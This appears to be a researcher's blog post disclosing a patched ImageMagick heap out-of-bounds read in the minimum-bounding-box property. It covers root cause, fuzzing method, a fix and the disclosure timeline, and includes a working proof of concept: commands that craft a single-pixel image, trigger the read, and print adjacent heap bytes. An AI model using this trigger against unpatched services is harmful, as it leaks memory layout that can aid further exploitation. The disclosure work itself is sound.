---
title: "A Single White Pixel That Read Memory It Shouldn't: GHSA-5222-mhv9-26rg"
date: October 2026
source: https://blog.imperonlabs.com/blog/imagemagick-minimum-bounding-box-oob-read.html
---

ImageMagick · Info Leak · Fuzzing

# A Single White Pixel That Read Memory It Shouldn't

By Yash Pandya · October 2026 · GHSA-5222-mhv9-26rg · 17 min read

Ask ImageMagick for the minimum bounding box of an image's foreground and it runs a tidy piece of computational geometry: find the convex hull of the foreground pixels, then spin a pair of "rotating calipers" around that hull to find the tightest enclosing rectangle. The algorithm starts its caliper indices at a sentinel value of `-1` and expects the search loop to overwrite them with real vertex indices. Feed it an image whose foreground is a *single pixel* and the hull collapses to one vertex, the search loop never finds a better answer, and the `-1` sentinels survive to be used as array indices, reading `vertices[-1]`, one slot before the array. Worse, those out-of-bounds values are then printed straight into a user-visible image property. A heap over-read with a disclosure channel bolted on.

Disclosure note. GHSA-5222-mhv9-26rg is a fixed, published ImageMagick advisory credited to me (`bewithyash`), patched in 7.1.2-33. No CVE was assigned. I found it by fuzzing `InterpretImageProperties()`, the image-property-escape surface that encoder/decoder fuzz harnesses never touch, then reduced it to a 163-byte image and a one-line command, and confirmed the root cause against a patched build.

## At a glance

- **Published severity.** Low. CVSS 3.1 base **3.3**, vector `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`. This is the rating ImageMagick assigned in the advisory, and the one I defer to throughout.
- **My own assessment (reporter's view, not the published rating).** Medium. I scored it `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N` = 4.3 for the CLI threat model, rising to 5.3 with `UI:N` when the property is interpolated by a network-facing service over uploaded images. I record this only as the finder's opinion; the published Low stands.
- **Weakness.** CWE-125 (Out-of-bounds Read) leading to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- **Affected function and file.** `GetImageMinimumBoundingBox()` in `MagickCore/attribute.c` (the rotating-calipers code). The AddressSanitizer crash site is `getDistance()` in the same file, reached through `getFeretDiameter()`.
- **Affected versions.** `< 7.1.2-33`. The vulnerable code was introduced by the 2020-04-04 calipers rewrite (commit `78cf68c26`) and had never been security-patched since, so every 7.0.x and later release before the fix is affected.
- **Patched version.** 7.1.2-33.
- **Advisory.** GHSA-5222-mhv9-26rg, credited to me (`bewithyash`). No CVE was assigned.
- **Primitive.** Heap out-of-bounds read of one adjacent 16-byte block (`vertices[-1]`). No out-of-bounds write, no memory corruption, no code-execution path, and no crash is required in a normal allocator. The read values are disclosed verbatim through image-property output.
- **Trigger.** A 163-byte PPM whose foreground is a single pixel, evaluated through the `%[minimum-bounding-box]` escape at ImageMagick's default resource policy, on any input format and any bitness (verified 64-bit).

## Attack surface: a property evaluator past the decoders

ImageMagick lets you interpolate *image properties* into output through percent-escapes: `%[width]`, `%[mean]`, and dozens more, expanded by `InterpretImageProperties()` whenever a format string is evaluated. That happens for the `-format` and `identify -format` options, for the `info:` writer, and inside every language binding that reports image metadata. These escapes matter as attack surface because they run real computation on attacker-supplied pixels, and because the surface is almost invisible to the fuzzing everyone else runs. Public fuzzing campaigns such as OSS-Fuzz hammer the *decoders* (the coders that parse PNG, JPEG, and so on). The property-escape evaluator is reached only *after* decoding, through a completely different entry point: a decoded `Image` is handed to `GetMagickProperty()`, which dispatches on the escape name. A harness that feeds bytes to the coders never touches it. I built a harness aimed squarely at the evaluator, and the minimum-bounding-box escape fell out of that campaign.

The relevant escape is `%[minimum-bounding-box]`, handled in `MagickCore/property.c:3314`, which calls `GetImageMinimumBoundingBox()` in `MagickCore/attribute.c`. That function computes the minimum-area enclosing rectangle of the image's foreground using the classic rotating-calipers algorithm: first it calls `GetImageConvexHull()` to reduce the foreground to its convex-hull vertices, then it spins a pair of calipers around the hull, testing each edge as a candidate supporting line and tracking the smallest-area rectangle it finds. The output is four corner points, plus a set of debug sub-properties that name the three hull vertices the winning rectangle rested on.

Any real pipeline that evaluates this property on attacker-influenced images reaches the vulnerable code. That includes a web service that interpolates a user-controlled `-format` or `identify -format` template, a thumbnailing or metadata service that expands the property on uploads, and any binding (PHP Imagick, Python Wand, the MagickWand C API, and so on) that calls the property through `InterpretImageProperties()`. There is no special resource policy and no unusual build involved: the trigger works at ImageMagick's default limits on any bitness, because this is pure index logic, not a size calculation that depends on `size_t` width.

## The vulnerable code, walked line by line

The function allocates its best-so-far record, `caliper_info`, and seeds it. The area is seeded with a finite upper bound, and the three vertex indices the rectangle refers to (`p`, `q`, `v`) are set to a `-1` sentinel meaning "no valid answer yet" (`MagickCore/attribute.c:1271-1273` at the tested HEAD; line numbers drift a few lines between releases):

```
// MagickCore/attribute.c  (GetImageMinimumBoundingBox)
caliper_info.area=2.0*image->columns*image->rows;   // finite seed
caliper_info.width=(double) image->columns+image->rows;
caliper_info.height=0.0;
caliper_info.projection=0.0;
caliper_info.p=(-1);
caliper_info.q=(-1);
caliper_info.v=(-1);
```

The search is a double loop over the hull vertices. The inner `j` loop finds the farthest vertex from the current edge (the Feret diameter), assigning the *loop-local* `p`, `q`, `v`. A second `k` loop projects every vertex onto that edge to get the rectangle's extent, and the candidate area is computed. Only if that area improves on the best seen so far are the local indices copied into `caliper_info`:

```
for (i=0; i < (ssize_t) number_hull_vertices; i++)
{
  double area=0.0, max_projection=0.0, min_diameter=-1.0, min_projection=0.0;
  ssize_t j, k;
  ssize_t p=-1, q=-1, v=-1;                 // loop-local candidates

  for (j=0; j < (ssize_t) number_hull_vertices; j++)
  {
    diameter=fabs(getFeretDiameter(&vertices[i],
      &vertices[(i+1) % (ssize_t) number_hull_vertices],&vertices[j]));
    if (min_diameter < diameter)
      { min_diameter=diameter; p=i; q=(i+1) % (ssize_t) number_hull_vertices; v=j; }
  }
  for (k=0; k < (ssize_t) number_hull_vertices; k++)
    { /* projections -> min_projection / max_projection */ }

  area=min_diameter*(max_projection-min_projection);
  if (caliper_info.area > area)             // [1] the ONLY writer of caliper_info.p/q/v
    {
      caliper_info.area=area; caliper_info.width=min_diameter;
      caliper_info.height=max_projection-min_projection;
      caliper_info.projection=max_projection;
      caliper_info.p=p; caliper_info.q=q; caliper_info.v=v;
    }
}
// [2] unconditional use: caliper_info.p/q/v are still -1 if [1] never fired:
diameter=getFeretDiameter(&vertices[caliper_info.p],
  &vertices[caliper_info.q],&vertices[caliper_info.v]);   // vertices[-1]  ->  HEAP OOB READ
```

Note the two scopes carefully. The *loop-local* `p/q/v` are re-initialized to `-1` every iteration and are reliably overwritten inside the `j` loop. The *record* `caliper_info.p/q/v` are a different storage: branch `[1]` at `attribute.c:1294-1312` is the only code that ever writes them. If `[1]` never executes, `caliper_info.p/q/v` keep the `-1` they were seeded with, and the unconditional read at `[2]` (`attribute.c:1310-1311`) computes `&vertices[-1]`, a `PointInfo` 16 bytes before the hull array. The helpers it calls both dereference that pointer; `getDistance()` at `attribute.c:1172` (reached through `getFeretDiameter()` at `attribute.c:1198`) is where AddressSanitizer catches the read.

The same out-of-bounds indices are then used to print debug sub-properties, and this is what turns a quiet over-read into a disclosure (`attribute.c:1361-1366`):

```
(void) FormatImageProperty(image,"minimum-bounding-box:_p","%.*g,%.*g",
  GetMagickPrecision(),vertices[caliper_info.p].x,   // vertices[-1].x
  GetMagickPrecision(),vertices[caliper_info.p].y);  // vertices[-1].y
(void) FormatImageProperty(image,"minimum-bounding-box:_q","%.*g,%.*g",
  GetMagickPrecision(),vertices[caliper_info.q].x,
  GetMagickPrecision(),vertices[caliper_info.q].y);
(void) FormatImageProperty(image,"minimum-bounding-box:_v","%.*g,%.*g",
  GetMagickPrecision(),vertices[caliper_info.v].x,
  GetMagickPrecision(),vertices[caliper_info.v].y);
```

When all three sentinels are `-1`, `_p`, `_q` and `_v` all read the *same* slot, `vertices[-1]`. The channel emits six decimal numbers, but they derive from a single 16-byte `PointInfo` (its two `double` fields, `x` and `y`) sitting immediately before the hull allocation, printed three times. Those sixteen bytes are whatever the allocator placed there: adjacent object fields, lengths, or pointer-shaped values.

## Root cause: a promise the loop does not always keep

The sentinel pattern encodes an implicit contract. Initializing `caliper_info.p/q/v` to `-1` is a way of saying "the loop will find at least one valid rectangle and overwrite these before anyone uses them." The code treats branch `[1]` as guaranteed to fire at least once. For any non-degenerate hull it does, so in practice the sentinels are always replaced, and the bug stays hidden. The sentinel is a promise that the loop will keep; degenerate input is exactly the case where the loop breaks the promise.

Trace the degenerate case precisely. Give the image a foreground of exactly one pixel. The convex hull of one point is a single vertex, so `number_hull_vertices == 1`. Now look at the helper (verbatim from the source):

```
static inline double getDistance(PointInfo *p,PointInfo *q)
{
  double distance;
  distance=hypot(p->x-q->x,p->y-q->y);
  return(distance*distance);
}
static inline double getFeretDiameter(PointInfo *p,PointInfo *q,PointInfo *v)
{
  double distance;
  distance=getDistance(p,q);
  if (distance < MagickEpsilon)
    return(INFINITY);
  return((q->x-p->x)*(v->y-p->y)-(v->x-p->x)*(q->y-p->y))/sqrt(distance);
}
```

With one vertex, the edge is `vertices[i]` to `vertices[(i+1) % 1]`, and `(i+1) % 1 == 0 == i`: the edge is a point to itself. Every `getFeretDiameter(&vertices[0], &vertices[0], ...)` call therefore has `p == q`, so `getDistance` returns 0, which is below `MagickEpsilon`, so `getFeretDiameter` returns `INFINITY`. The inner `j` loop still sets its local `min_diameter` to `INFINITY` and its local `p/q/v` to `0`, but the projection step (which uses the same guarded helper) yields non-finite projections, so `area = min_diameter * (max_projection - min_projection)` becomes `INF` or `NaN`. The acceptance test `caliper_info.area > area` compares a finite seed against `INF`/`NaN` and is *false* on every iteration (any comparison against `NaN` is false, and finite is never greater than `+INF`). Branch `[1]` never fires. The `-1` record sentinels survive to `[2]`. The same collapse occurs for any hull whose edges are all zero-length (for example duplicate adjacent vertices), so a single pixel is simply the cleanest way to produce it.

The defect is not the geometry math and not the sentinel idea. It is that a value which is only valid after a conditional write is consumed unconditionally, with no check that the write ever happened.

## Full reproduction

I verified this on a cloud VM (Ubuntu 24.04, x86-64) against ImageMagick at HEAD `e87c97d2c1d19dd6bf138e79b9ded4befde54794` (2026-09-28), which reports `ImageMagick 7.1.2-33 (Beta) Q16-HDRI x86_64`. The build is a 64-bit Q16-HDRI sanitizer build:

```
# Build ImageMagick with AddressSanitizer (+UBSan in the primary build)
CFLAGS="-fsanitize=address -g -O1" ./configure --disable-shared
make

# Confirm the target:
#   ImageMagick 7.1.2-33 (Beta) Q16-HDRI x86_64 ... (clang 18.1.3)
```

The trigger image is a 5x5 black PPM with one white pixel at (2,2). As raw bytes it is a `P6` header (`P6\n5 5\n255\n`) followed by 75 pixel bytes that are all `0x00` except the three bytes for pixel (2,2), which are `ff ff ff`. That is 163 bytes total, and it is trivially hand-craftable; the one-liner below generates it:

```
# Craft the 163-byte single-foreground-pixel trigger:
magick -size 5x5 xc:black -fill white -draw 'point 2,2' single-fg.ppm

# Trigger the out-of-bounds read through the standard property escape:
ASAN_OPTIONS=detect_leaks=0:allocator_may_return_null=1 \
magick single-fg.ppm -format '%[minimum-bounding-box]' info:
```

AddressSanitizer reports the over-read, verbatim (identical across three runs, 3/3 reproducible):

```
==1189352==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000002c60 at pc 0x55641bd7d00f ...
READ of size 8 at 0x502000002c60 thread T0
    #0 0x55641bd7d00e in getDistance /root/im-hunt/ImageMagick/MagickCore/attribute.c:1172:21
    #1 0x55641bd7d00e in getFeretDiameter /root/im-hunt/ImageMagick/MagickCore/attribute.c:1198:12
    #2 0x55641bd7bbe5 in GetImageMinimumBoundingBox /root/im-hunt/ImageMagick/MagickCore/attribute.c:1310:12
    #3 0x55641baa8797 in GetMagickProperty /root/im-hunt/ImageMagick/MagickCore/property.c:3314:24
    #4 ... in InterpretImageProperties ... WriteINFOImage ... (CLI)
0x502000002c60 is located 16 bytes before 16-byte region [0x502000002c70,0x502000002c80)
allocated by thread T0 here:
    #1 ... in GetImageConvexHull /root/im-hunt/ImageMagick/MagickCore/attribute.c:858:29
    #2 ... in GetImageMinimumBoundingBox /root/im-hunt/ImageMagick/MagickCore/attribute.c:1236:12
SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/attribute.c:1172:21 in getDistance
```

How to read it. The faulting access is a `READ of size 8` (one `double`) at an address that ASan places `16 bytes before` a `16-byte region`. The 16-byte region is the hull allocation (`1 vertex x sizeof(PointInfo)`, allocated in `GetImageConvexHull`), and 16 bytes before it is exactly `vertices[-1]`: the sentinel `p == -1` scaled by the 16-byte element size. The top frames (`getDistance` and `getFeretDiameter` inlined at the same PC, under `GetImageMinimumBoundingBox`, reached from `GetMagickProperty` and the property interpreter) are the `[2]` unconditional read from the source walk-through. I reproduced the same crash independently on a separate macOS x86-64 ASan build of the same release, where line numbers shifted (the read showed as `attribute.c:1323` and the hull allocation as `attribute.c:871` under `InterpretImageProperties` at `property.c:4248` and `WriteINFOImage` at `info.c:217`), landing on the identical `16 bytes before 16-byte region`. The bug was also surfaced three times over by the fuzzer: three independent corpus units all hit this stack.

The disclosure channel is the property output itself. Each of the six formatted values at `attribute.c:1361-1366` is one of the two `double`s from `vertices[-1]`, rendered with `%.*g` at `GetMagickPrecision()`. Because those are genuine IEEE-754 doubles, raising the output precision makes the printed decimal round-trip to the exact adjacent heap bytes. On a non-sanitizer build:

```
magick single-fg.ppm -precision 17 -format '%[minimum-bounding-box:_p]' info:

# leaked _p = 6.0972641353268236e-320,0
# first double as raw bytes: 3530000000000000   ascii: b'50\x00\x00\x00\x00\x00\x00'
```

In that run the leaked `x` field decoded to the bytes `35 30 00 00 00 00 00 00`, which is the ASCII text `50` followed by zero padding, and the `y` field was `0`. Repeated runs decode to different bytes, confirming the read lands on live, variable heap content rather than a constant. So the leaked values are decimal numbers in the caller's output, and those numbers are the adjacent heap bytes reinterpreted as doubles.

## Impact, honestly stated

This is a read-only primitive: a heap out-of-bounds read of one adjacent 16-byte block, with its contents disclosed through the property output. There is no out-of-bounds write, no memory corruption, and no demonstrated code-execution path; the read feeds only the bounding-box geometry and the property printer. It is also not a denial of service in practice, because the read lands in mapped heap one element before the allocation and does not fault in a normal allocator (only a sanitizer traps it). What makes it more interesting than its on-paper rating is the combination of properties: it fires at ImageMagick's default resource policy, on any input format, on any bitness, with no special configuration, and it emits adjacent heap bytes directly into caller-visible output. In a service that evaluates `%[minimum-bounding-box]` on user-supplied images, that is a remotely reachable disclosure of heap-adjacent memory (allocator metadata or neighboring object fields), which is exactly the kind of ASLR and heap-layout leak that can grease a separate exploit chain.

ImageMagick's published advisory rates it **Low, CVSS 3.3** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`): a local vector, user interaction, and a limited confidentiality impact with no integrity or availability effect. My own assessment, which I flag as the reporter's view rather than the published rating, is Medium: for the CLI threat model I scored `AV:N/.../UI:R` = 4.3, and for a network service that interpolates the property on uploads I would drop `UI:R` to `UI:N` for 5.3. Both are Medium at most, the disclosure really is bounded (one fixed-offset 16-byte block, the attacker does not choose the address), and I defer to the Low that ImageMagick assigned.

## How I found it: fuzzing the surface the coders hide

The finding came out of a dedicated property-escape fuzz harness. Instead of feeding bytes to the image coders (the surface every public campaign already saturates), the harness drives `InterpretImageProperties()`: it auto-detects a small seed image and then mutates structure-aware `%[...]` escape strings, so the fuzzer explores the evaluator's own dispatch and the per-property computation that encoder and decoder harnesses never reach. The minimum-bounding-box path crashed, and three independent corpus units converged on the same stack, which is a strong signal that the crash is a real, reachable defect rather than a harness artifact.

From there the work was reduction and root-causing. I minimized the crashing input to a single 163-byte PPM (one foreground pixel) with a one-line generator, read the degenerate-hull path by hand to explain exactly why branch `[1]` never fires, and captured negative controls: a normal multi-vertex hull (an 8x8 image with a 6x6 white rectangle) prints the correct box `6,1 6,6 1,6 1,1` with no sanitizer report, confirming the bug is specific to the degenerate case rather than a general problem with the function. Finally I verified the git history to establish novelty: `git log -S'getFeretDiameter' -- MagickCore/attribute.c` returns only the 2020-04-04 rewrite (`78cf68c26`), and `git diff` against `origin/main` showed zero changes to the caliper code, so the sentinel underflow had been live and un-fixed since April 2020 and was not an incomplete fix of any prior advisory.

## Remediation and upgrade guidance

The fix is to reject the degenerate result before the unconditional use. After the search loop, if any of `p`, `q`, `v` is still negative, no valid rectangle was found, so free the buffers and return cleanly instead of indexing with `-1`. This is the patch I proposed and verified: with it applied to a second sanitizer build, the same PoC produces no ASan report and the function returns `NULL` cleanly.

```
if ((caliper_info.p < 0) || (caliper_info.q < 0) || (caliper_info.v < 0))
  {
    vertices=RelinquishMagickMemory(vertices);
    bounding_box=RelinquishMagickMemory(bounding_box);
    *number_vertices=0;
    return((PointInfo *) NULL);
  }
diameter=getFeretDiameter(&vertices[caliper_info.p],
  &vertices[caliper_info.q],&vertices[caliper_info.v]);
```

An equivalent guard is to initialize `p=q=v=0`, or to skip the caliper loop entirely when `number_hull_vertices < 2`, so the sentinels can never be consumed. The practical guidance is to upgrade to **7.1.2-33** or later (affected: `< 7.1.2-33`). If you cannot upgrade immediately, do not evaluate the `%[minimum-bounding-box]` family of escapes on untrusted images, and do not let untrusted input flow into `-format` or `identify -format` templates that reach this property. The weakness is CWE-125 (Out-of-bounds Read) leading to CWE-200 (Information Exposure).

## Honest caveats and disclosure timeline

- **Read-only.** There is no out-of-bounds write and no corruption primitive, which is why the vector carries `I:N` and `A:N`. The read feeds geometry math and the property printer, nothing else.
- **Disclosure fidelity.** At the default output precision the values are printed through `%.*g`, so what you recover is magnitude and mantissa bits rather than an exact byte string: enough to fingerprint heap contents and leak pointer-shaped values, not a clean raw dump. Because the bytes are a real double, though, raising precision (`-precision 17`) makes the printed decimal round-trip to the exact eight adjacent bytes, as the demo above shows.
- **Bounded read.** The offset is fixed (one 16-byte element before the hull). The attacker does not choose the address, so this is a narrow, fixed-offset leak, most useful as a heap-layout or ASLR disclosure aid rather than a general memory reader.
- **Same file, different bug.** This lives in the same `attribute.c` as a separately reported convex-hull allocation finding, but it is a different function, a different mechanism (an index underflow in the caliper consumer versus an allocation-size wrap in a write loop), a different bitness profile (64-bit reachable versus 32-bit only), and different preconditions (default policy versus raised limits). It is not an incomplete fix of any existing advisory; this code had never been security-patched.

Timeline: I found the crash with the property-escape fuzzer over 2026-10-01 to 2026-10-04 (three corpus units), minimized it to the 163-byte PPM and one-liner, root-caused it to the caliper sentinels, and captured the negative and patched-build controls, finalizing the advisory on 2026-10-04. It was live on upstream `main` at report time. Upstream subsequently shipped the fix in 7.1.2-33 and published it as GHSA-5222-mhv9-26rg, credited to me, with no CVE assigned.

The one line to remember
A sentinel like `-1` is a promise that the loop will overwrite it. Degenerate input (a single-pixel hull) breaks the promise, and an index that was never meant to be used reads one slot before the array and prints it to the caller.

### The dangerous code is the code nobody fuzzes.

Imperonlabs targets the surfaces standard harnesses miss (property evaluators, option parsers, list operations), where attacker input reaches real computation. We reduce every crash to a minimal, root-caused finding with a tested fix.

[Request an assessment](https://imperonlabs.com/#contact)
